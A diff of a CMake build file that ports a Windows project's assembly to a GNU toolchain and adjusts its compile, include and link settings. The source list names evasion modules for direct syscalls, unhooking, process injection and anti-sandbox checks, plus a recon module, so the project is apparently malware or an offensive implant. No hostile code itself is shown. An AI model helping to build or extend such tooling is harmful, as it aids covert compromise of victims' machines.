@@ -9,10 +9,12 @@ set(CMAKE_CXX_STANDARD 20)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
 set(CMAKE_CXX_EXTENSIONS OFF)
 
+add_definitions(-DSQLITE_OMIT_FTS5)
+
 include(cmake/CompileOptions.cmake)
 include(FetchContent)
 
-enable_language(ASM_MASM)
+enable_language(ASM)
 
 # nlohmann-json
 FetchContent_Declare(
@@ -61,7 +63,7 @@ add_executable(main WIN32
     src/fs/FileSystem.cpp
     src/recon/DeepRecon.cpp
     src/evasion/Syscalls.cpp
-    src/evasion/SyscallStub.asm
+    src/evasion/SyscallStub.s
     src/evasion/Unhooker.cpp
     src/evasion/Injector.cpp
     src/evasion/AntiSandbox.cpp
@@ -76,10 +78,10 @@ add_executable(main WIN32
     external/sqlite3/sqlite3.c
 )
 
-target_include_directories(main PUBLIC external external/sqlite3)
+target_include_directories(main PUBLIC src external external/sqlite3)
 target_link_libraries(main 
     nlohmann_json::nlohmann_json
-    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 mscoree dbghelp wlanapi netapi32 bthprops
+    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 dbghelp wlanapi netapi32 bthprops
 )
 
 # Tests
